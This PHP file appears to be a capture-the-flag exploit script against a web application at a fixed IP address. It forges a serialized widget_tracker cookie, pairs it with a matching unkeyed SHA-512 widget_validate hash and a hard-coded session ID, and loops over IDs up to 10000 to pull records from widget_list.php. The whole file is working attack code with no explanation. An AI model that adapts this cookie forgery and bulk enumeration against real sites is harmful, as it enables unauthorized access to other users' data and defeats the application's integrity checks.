<?php
     
function getValues($x) {
	$ids = array();
     
	echo "x: $x";
     
	for ($i=$x; $i<$x+100; $i++) {
		$ids[] = $i;
	}
     
	$widget_tracker = serialize($ids);
	$widget_validate = hash("sha512", $widget_tracker);
	$widget_tracker = urlencode(base64_encode($widget_tracker));
     
	$cookie = "PHPSESSID=pmijceglok20ahdacmufc8cui7; widget_tracker={$widget_tracker}; widget_validate={$widget_validate}";
     
	$ch = curl_init('http://128.238.66.224/widget_list.php');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	$result = curl_exec($ch);
     
	$result = preg_replace("/<br \/>/", "\n", $result);
//      $result = preg_replace("/.*<\/a>\]/", "", $result);
     
	return $result;
}
     
for ($i=1; $i<10000; $i+=100) {
	echo getValues($i);
	sleep(1);      
}

